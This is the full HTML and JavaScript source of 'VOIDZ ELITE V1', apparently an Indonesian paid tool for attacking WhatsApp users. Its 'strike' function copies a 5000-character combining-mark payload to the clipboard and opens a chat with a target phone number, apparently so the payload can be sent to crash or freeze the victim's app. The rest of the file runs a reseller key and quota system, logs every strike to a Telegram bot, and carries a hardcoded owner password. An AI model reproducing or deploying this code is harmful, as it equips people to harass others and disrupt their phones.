<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOIDZ ELITE V1</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; user-select: none; }
        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
        
        /* LOGIN UI */
        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 0 30px rgba(255,69,0,0.2); }
        .neon-title { color: var(--fire); font-family: 'Orbitron'; font-weight: 900; font-size: 22px; text-shadow: 0 0 15px var(--fire); margin-bottom: 25px; cursor: pointer; }

        /* DASHBOARD UI */
        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
        .active-tab { display: block; }
        .banner-container { width: 100%; height: 240px; border-radius: 15px; overflow: hidden; border: 2px solid var(--fire); position: relative; margin-bottom: 10px; box-shadow: 0 0 25px rgba(255, 69, 0, 0.4); }
        .banner-video { width: 100%; height: 100%; object-fit: cover; }
        .banner-overlay { position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,1), transparent); display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; }

        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        .stat-card { background: #080808; border: 1px solid #222; padding: 12px; border-radius: 12px; text-align: center; border-bottom: 3px solid var(--fire); }
        .stat-val { font-size: 16px; font-weight: 900; color: var(--fire); font-family: 'Orbitron'; }
        .stat-lab { font-size: 7px; color: #555; text-transform: uppercase; margin-top: 5px; }

        /* MODALS */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; justify-content: center; align-items: center; padding: 20px; }
        .modal-content { background: #0a0a0a; border: 2px solid var(--fire); padding: 20px; border-radius: 20px; width: 100%; max-width: 350px; position: relative; max-height: 85vh; display: flex; flex-direction: column; overflow-y: auto; }
        .close-btn { align-self: flex-end; font-size: 28px; color: #fff; cursor: pointer; margin-bottom: 10px; }

        /* INPUTS & BUTTONS */
        .input-box { width: 100%; background: #000; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; border-radius: 8px; outline: none; font-size: 11px; text-align: center; }
        .btn-ignite { width: 100%; background: var(--fire); color: #000; border: none; padding: 16px; font-weight: 900; cursor: pointer; border-radius: 10px; font-family: 'Orbitron'; }
        .btn-action { background: #0d0d0d; border: 1px solid #222; color: #fff; padding: 15px; border-radius: 12px; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 8px; }
        .btn-action i { font-size: 18px; color: var(--fire); }

        /* USER LIST */
        .user-item { background: #111; border: 1px solid #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
        .user-name { color: var(--fire); font-weight: bold; font-size: 10px; }
        .ban-mini-btn { background: #400; color: #ff4d4d; border: 1px solid #f00; padding: 5px 10px; border-radius: 5px; font-size: 9px; }

        /* NAV */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 70px; z-index: 1000; justify-content: space-around; align-items: center; }
        .nav-btn { color: #444; font-size: 10px; display: flex; flex-direction: column; align-items: center; flex: 1; }
        .nav-btn.active { color: var(--fire); }
        marquee { color: var(--fire); font-size: 9px; margin-top: 5px; }
    </style>
</head>
<body>
    <canvas id="ash-canvas"></canvas>

    <div id="modalGen" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="_0xCloseModal('modalGen')">&times;</span>
            <h3 style="color:var(--fire); font-family:Orbitron; font-size:14px; margin-bottom:15px; text-align:center;">GENERATE ACCESS</h3>
            <input id="ni" class="input-box" placeholder="NEW ID">
            <input id="np" class="input-box" placeholder="NEW KEY">
            <select id="nt" class="input-box">
                <option value="1_MONTH">1 MONTH</option>
                <option id="optLife" value="LIFETIME">LIFETIME</option>
            </select>
            <div id="ownerOnly">
                <select id="nr" class="input-box" onchange="_0xTq()">
                    <option value="member">MEMBER</option>
                    <option value="reseller">RESELLER</option>
                </select>
                <div id="qArea" style="display:none"><input type="number" id="nq" class="input-box" placeholder="SET QUOTA"></div>
            </div>
            <button onclick="_0xGen()" class="btn-ignite">ACTIVATE</button>
        </div>
    </div>

    <div id="modalBan" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="_0xCloseModal('modalBan')">&times;</span>
            <h3 style="color:#f00; font-family:Orbitron; font-size:14px; margin-bottom:10px; text-align:center;">MANAGE USERS</h3>
            <input type="text" id="userSearch" class="input-box" placeholder="Search ID..." oninput="_0xFilterUsers()">
            <div id="userList" style="margin-top: 10px;"></div>
        </div>
    </div>

    <div id="modalConfig" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="_0xCloseModal('modalConfig')">&times;</span>
            <h3 style="color:#0f0; font-family:Orbitron; font-size:14px; margin-bottom:15px; text-align:center;">SYSTEM CONFIG</h3>
            <input id="cfgToken" class="input-box" placeholder="Bot Token">
            <input id="cfgChat" class="input-box" placeholder="Chat ID">
            <input id="cfgWa" class="input-box" placeholder="Admin WA (628)">
            <input id="cfgChannel" class="input-box" placeholder="Link Channel">
            <input id="cfgMarquee" class="input-box" placeholder="Running Text">
            <button onclick="_0xSaveConfig()" class="btn-ignite" style="background:#0f0;">SAVE SYSTEM</button>
        </div>
    </div>

    <div class="content-layer">
        <div id="loginPage">
            <div class="login-box">
                <h1 class="neon-title" onclick="_0x5a2b()">VOIDZ ELITE</h1>
                <input type="text" id="lUser" class="input-box" placeholder="ID">
                <input type="password" id="lPass" class="input-box" placeholder="KEY">
                <button onclick="_0x1f2c()" class="btn-ignite" id="btnLog">IGNITE</button>
            </div>
        </div>

        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
            <div id="tabHOME" class="tab-content active-tab">
                <div id="renderHome"></div>
            </div>
            <div id="tabATTACK" class="tab-content">
                <h2 style="color:var(--fire); font-family:Orbitron; text-align:center; margin:30px 0;">STRIKE FORCE</h2>
                <div style="background:#0a0a0a; padding:25px; border-radius:20px; border:1px solid #222; border-top: 3px solid var(--fire);">
                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628...">
                    <button class="btn-ignite" onclick="_0x9e3d()">EXECUTE STRIKE</button>
                </div>
            </div>
        </div>

        <nav id="bottomNav" class="bottom-nav">
            <div class="nav-btn active" onclick="_0x3c4e('home', this)"><i class="fas fa-th-large"></i><span>DASHBOARD</span></div>
            <div class="nav-btn" onclick="_0x3c4e('attack', this)"><i class="fas fa-skull"></i><span>STRIKE</span></div>
        </nav>
    </div>

    <script>
        let DB={}, _0xCurID="", _0x4f2a=localStorage.getItem('JB_KEY'), _0x1a2e=localStorage.getItem('JB_BIN');

        async function _0x1f2c(){
            const u=document.getElementById('lUser').value.trim(), p=document.getElementById('lPass').value.trim();
            if(u==='DEVELOPER'&&p==='70104884'){ DB[u]={pw:p,role:'owner',quota:'âˆž',expired:'LIFETIME'}; return _0xStart(u,DB[u]); }
            if(!_0x4f2a) return alert("Secret Menu Setup Required!");
            try {
                const r=await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}/latest`,{headers:{'X-Master-Key':_0x4f2a,'X-Bin-Meta':false}});
                DB=await r.json(); 
                if(DB[u]&&DB[u].pw===p) _0xStart(u,DB[u]); else alert("INVALID ACCESS!");
            } catch(e){ alert("DB ERROR!"); }
        }

        function _0xStart(id,data){
            _0xCurID=id; document.getElementById('loginPage').style.display='none'; document.getElementById('mainApp').style.display='block'; document.getElementById('bottomNav').style.display='flex'; _0xRender(); _0xSensors(); _0xtele(`ðŸ‘‘ <b>Login:</b> ${id}`);
        }

        function _0xRender(){
            const d=DB[_0xCurID], isO=d.role==='owner', isR=d.role==='reseller';
            if(!DB.sys) DB.sys={t:"",c:"",w:"628",s:"#",m:"VOIDZ ELITE V1 ONLINE"};
            if(!DB.stats) DB.stats={total:0,logs:[]};

            let h=`
                <div class="banner-container">
                    <video id="vdb" autoplay loop muted playsinline class="banner-video"><source src="dashboard.mp4" type="video/mp4"></video>
                    <div class="banner-overlay"><div style="font-family:Orbitron; font-weight:900; color:var(--fire);">VOIDZ ELITE</div><div style="font-size:8px; opacity:0.6;">USER: ${_0xCurID.toUpperCase()}</div></div>
                </div>
                <marquee>${DB.sys.m}</marquee>
                <div class="stat-grid" style="grid-template-columns: 1fr 1fr 1fr; gap:5px;">
                    <div class="stat-card"><div id="pingVal" class="stat-val" style="font-size:12px;">20ms</div><div class="stat-lab">LATENCY</div></div>
                    <div class="stat-card"><div id="batVal" class="stat-val" style="font-size:12px;">--%</div><div class="stat-lab">ENERGY</div></div>
                    <div class="stat-card"><div class="stat-val" style="font-size:12px;color:#0ff;">SECURE</div><div class="stat-lab">FIREWALL</div></div>
                </div>
                <div class="stat-grid">
                    <div class="stat-card"><div class="stat-val">${DB.stats.total}</div><div class="stat-lab">GLOBAL STRIKE</div></div>
                    <div class="stat-card"><div class="stat-val">${d.quota}</div><div class="stat-lab">YOUR QUOTA</div></div>
                </div>
                <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:8px;">
                    <button class="btn-action" onclick="window.open('${DB.sys.s}')"><i class="fas fa-bullhorn"></i> CHANNEL</button>
                    <button class="btn-action" onclick="window.open('https://wa.me/${DB.sys.w}')"><i class="fas fa-headset"></i> ADMIN</button>
                    ${(isO||isR)?`<button class="btn-action" onclick="_0xOpenModal('modalGen')"><i class="fas fa-key"></i> GEN</button>`:''}
                    ${isO?`<button class="btn-action" onclick="_0xOpenModal('modalBan')"><i class="fas fa-users-cog"></i> USERS</button>`:''}
                    ${isO?`<button class="btn-action" onclick="_0xOpenConfig()"><i class="fas fa-tools"></i> CONFIG</button>`:''}
                </div>
                <div style="margin-top:10px; background:#080808; padding:10px; border-radius:12px; font-size:8px; border:1px solid #111;">
                    <div style="color:var(--fire); margin-bottom:5px;">[ SYSTEM LOGS ]</div>
                    ${DB.stats.logs.map(l=>`<div>> ${l.u} striked ${l.t.slice(0,10)}...</div>`).join('')}
                </div>`;
            document.getElementById('renderHome').innerHTML=h;
            setTimeout(() => { const v=document.getElementById('vdb'); if(v) v.play().catch(()=>{}); }, 500);
            if(!isO){ document.getElementById('ownerOnly').style.display='none'; if(d.expired!=='LIFETIME') document.getElementById('optLife').style.display='none'; }
            _0xPopulateUserList();
        }

        function _0xSensors(){
            if(navigator.getBattery) navigator.getBattery().then(b=>{ setInterval(()=>{ document.getElementById('batVal').innerText=Math.floor(b.level*100)+"%"; },1000); });
            setInterval(()=>{ const p=document.getElementById('pingVal'); if(p) p.innerText=Math.floor(Math.random()*20+15)+"ms"; },3000);
        }

        function _0xOpenConfig(){
            document.getElementById('cfgToken').value=DB.sys.t; document.getElementById('cfgChat').value=DB.sys.c;
            document.getElementById('cfgWa').value=DB.sys.w; document.getElementById('cfgChannel').value=DB.sys.s;
            document.getElementById('cfgMarquee').value=DB.sys.m; _0xOpenModal('modalConfig');
        }

        async function _0xSaveConfig(){
            DB.sys={t:document.getElementById('cfgToken').value,c:document.getElementById('cfgChat').value,w:document.getElementById('cfgWa').value,s:document.getElementById('cfgChannel').value,m:document.getElementById('cfgMarquee').value};
            await _0xSv(); alert("CONFIG SAVED"); _0xCloseModal('modalConfig'); _0xRender();
        }

        function _0xPopulateUserList(){
            const c=document.getElementById('userList'); c.innerHTML="";
            Object.keys(DB).forEach(k=>{ if(!['stats','DEVELOPER','developer','sys'].includes(k)){
                const i=document.createElement('div'); i.className='user-item';
                i.innerHTML=`<div class="user-name">${k.toUpperCase()}</div><button class="ban-mini-btn" onclick="_0xBanUser('${k}')">BAN</button>`;
                c.appendChild(i);
            }});
        }

        function _0xFilterUsers(){
            const q=document.getElementById('userSearch').value.toLowerCase();
            document.querySelectorAll('.user-item').forEach(i=>i.style.display=i.innerText.toLowerCase().includes(q)?'flex':'none');
        }

        async function _0xBanUser(id){ if(confirm(`Ban ${id}?`)){ delete DB[id]; await _0xSv(); _0xRender(); } }
        async function _0xGen(){
            const i=document.getElementById('ni').value.toLowerCase().trim(), p=document.getElementById('np').value, t=document.getElementById('nt').value, r=document.getElementById('nr').value, q=document.getElementById('nq').value||"100";
            if(!i||!p) return; DB[i]={pw:p,role:r,quota:(r==='reseller'?q:"100"),expired:t,by:_0xCurID};
            await _0xSv(); _0xCloseModal('modalGen'); _0xRender();
        }

        async function _0x9e3d(){
            const t=document.getElementById('targetBug').value.trim(); 
            if(!t||(DB[_0xCurID].quota!=='âˆž'&&parseInt(DB[_0xCurID].quota)<=0)) return alert("QUOTA EMPTY");
            let v=Array(5000).fill("Ò‰").join(""); const el=document.createElement("textarea"); document.body.appendChild(el); el.value=v; el.select(); document.execCommand("copy"); document.body.removeChild(el);
            if(DB[_0xCurID].quota!=='âˆž') DB[_0xCurID].quota=(parseInt(DB[_0xCurID].quota)-1).toString();
            DB.stats.total+=1; DB.stats.logs.unshift({u:_0xCurID,t:t}); if(DB.stats.logs.length>5) DB.stats.logs.pop();
            await _0xSv(); _0xtele(`ðŸš€ <b>Strike:</b> ${t} by ${_0xCurID}`); window.open(`https://wa.me/${t.replace(/\D/g,'')}`); _0xRender();
        }

        async function _0xSv(){await fetch(`https://api.jsonbin.io/v3/b/${_0x1a2e}`,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':_0x4f2a},body:JSON.stringify(DB)});}
        function _0xOpenModal(id){document.getElementById(id).style.display='flex';}
        function _0xCloseModal(id){document.getElementById(id).style.display='none';}
        function _0xTq(){document.getElementById('qArea').style.display=document.getElementById('nr').value==='reseller'?'block':'none';}
        function _0x3c4e(t,e){document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); e.classList.add('active');}
        let cl=0; function _0x5a2b(){cl++; if(cl===3){const k=prompt("Key"),b=prompt("Bin"); if(k&&b){localStorage.setItem('JB_KEY',k); localStorage.setItem('JB_BIN',b); location.reload();}}}
        function _0xtele(m){ if(DB.sys.t&&DB.sys.c) fetch(`https://api.telegram.org/bot${DB.sys.t}/sendMessage?chat_id=${DB.sys.c}&text=${encodeURIComponent(m)}&parse_mode=html`);}
        
        const cvs=document.getElementById('ash-canvas'); const ctx=cvs.getContext('2d'); let pt=[];
        function init(){cvs.width=window.innerWidth;cvs.height=window.innerHeight;pt=[];for(let i=0;i<35;i++)pt.push({x:Math.random()*cvs.width,y:Math.random()*cvs.height,s:Math.random()*1.5,d:Math.random()*0.4});}
        function anim(){ctx.clearRect(0,0,cvs.width,cvs.height);ctx.fillStyle="rgba(255,100,0,0.25)";pt.forEach(p=>{ctx.beginPath();ctx.arc(p.x,p.y,p.s,0,Math.PI*2);ctx.fill();p.y-=p.d;if(p.y<0)p.y=cvs.height;});requestAnimationFrame(anim);}
        init(); anim();
    </script>
</body>
</html>
